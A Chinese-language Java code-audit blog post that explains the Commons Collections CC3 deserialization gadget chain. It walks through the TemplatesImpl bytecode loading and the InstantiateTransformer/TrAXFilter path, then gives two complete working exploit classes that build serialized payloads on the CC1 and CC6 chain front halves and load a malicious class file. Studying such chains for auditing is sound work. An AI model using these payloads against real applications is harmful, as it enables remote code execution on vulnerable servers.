---
title: CC3
date: 2026-08-04 10:43:00
categories:
  - java代码审计
tags:
  - Java
  - 反序列化
  - Commons Collections
---

## CC3

CC3 链同之前我们讲的 CC1 链与 CC6 链的区别之处是非常大的。原本的 CC1 链与 CC6 链是通过 `Runtime.exec()` 进行**命令执行**的。而很多时候服务器的代码当中的黑名单会选择禁用 `Runtime`。

而 CC3 链这里呢，则是通过动态加载类加载机制来实现自动执行**恶意类代码**的。

利用 **利用 ClassLoader#defineClass 直接加载字节码**的手段。

![img](/images/java-code-audit/04-cc3/20260803195554917.png)

现在我们的 `defineClass()` 方法的作用域为 `protected`，我们需要找到作用域为 `public` 的类，方便我们利用。照样 find usages

在 `TemplatesImpl` 类的 `static class TransletClassLoader` 中找到了我们能够运用的类。

![image-20260804094037589](/images/java-code-audit/04-cc3/20260804094037929.png)

因为作用域是 private，所以我们看一看谁调用了 `defineTransletClasses()` 方法

- 这里还有一点需要注意的，`_bytecodes` 的值不能为 null，否则会抛出异常。

![image-20260804094457906](/images/java-code-audit/04-cc3/20260804094458033.png)

还是同一个类下的 `getTransletInstance()` 方法调用了 `defineTransletClasses()` 方法，并且这里有一个 `newInstance()` 实例化的过程，如果能走完这个函数那么就能动态执行代码，但是因为它是私有的，所以继续找。

![image-20260804094721276](/images/java-code-audit/04-cc3/20260804094721336.png)

- 找到了一个 public 的方法，接下来我们开始利用。

![image-20260804095425506](/images/java-code-audit/04-cc3/20260804095425755.png)

![img](/images/java-code-audit/04-cc3/20260804100543007.png)

反正就是挨个设置

![image-20260804101839497](/images/java-code-audit/04-cc3/20260804101839773.png)

这个类的构造函数中有这一条语句，所以我们只要执行这个类的构造函数即可命令执行。

CC3 这里的作者没有调用 `InvokerTransformer`，而是调用了一个新的类 `InstantiateTransformer`。

- `InstantiateTransformer` 这个类是用来初始化 `Transformer` 的，我们去找 `InstantiateTransformer` 类下的 `transform` 方法。

![image-20260804102437100](/images/java-code-audit/04-cc3/20260804102437331.png)

构造exp


### cc1作为前半段

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.Field;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// CC3 链最终 EXPpublic class CC3FinalEXP {  
    public static void main(String[] args) throws Exception  
    {  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //    templates.newTransformer();  
  
 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},  
 new Object[]{templates});  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  
 instantiateTransformer  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer);  
  
 Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
 Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
 declaredConstructor.setAccessible(true);  
 InvocationHandler invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);  
  
 Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()  
                , new Class[]{Map.class}, invocationHandler);  
 Object o = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);  
  
 serialize(o);  
 unserialize("ser.bin");  
 }  
  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```

### CC6 链作为前半部分

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;  
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InstantiateTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.xml.transform.Templates;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.nio.file.Files;  
import java.nio.file.Paths;  
import java.util.HashMap;  
import java.util.Map;  
  
// 用 CC6 链的前半部分链子  
public class CC3FinalEXP2 {  
    public static void main(String[] args) throws Exception{  
        TemplatesImpl templates = new TemplatesImpl();  
 Class templatesClass = templates.getClass();  
 Field nameField = templatesClass.getDeclaredField("_name");  
 nameField.setAccessible(true);  
 nameField.set(templates,"Drunkbaby");  
  
 Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");  
 bytecodesField.setAccessible(true);  
 byte[] evil = Files.readAllBytes(Paths.get("E://Calc.class"));  
 byte[][] codes = {evil};  
 bytecodesField.set(templates,codes);  
  
 Field tfactoryField = templatesClass.getDeclaredField("_tfactory");  
 tfactoryField.setAccessible(true);  
 tfactoryField.set(templates, new TransformerFactoryImpl());  
 //    templates.newTransformer();  
  
 InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},  
 new Object[]{templates});  
 Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数  
 instantiateTransformer  
        };  
 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
 HashMap<Object, Object> hashMap = new HashMap<>();  
 Map lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer("five")); // 防止在反序列化前弹计算器  
 TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");  
 HashMap<Object, Object> expMap = new HashMap<>();  
 expMap.put(tiedMapEntry, "value");  
 lazyMap.remove("key");  
  
 // 在 put 之后通过反射修改值  
 Class<LazyMap> lazyMapClass = LazyMap.class;  
 Field factoryField = lazyMapClass.getDeclaredField("factory");  
 factoryField.setAccessible(true);  
 factoryField.set(lazyMap, chainedTransformer);  
  
 serialize(expMap);  
 unserialize("ser.bin");  
 }  
    public static void serialize(Object obj) throws IOException {  
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));  
 oos.writeObject(obj);  
 }  
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{  
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));  
 Object obj = ois.readObject();  
 return obj;  
 }  
}
```

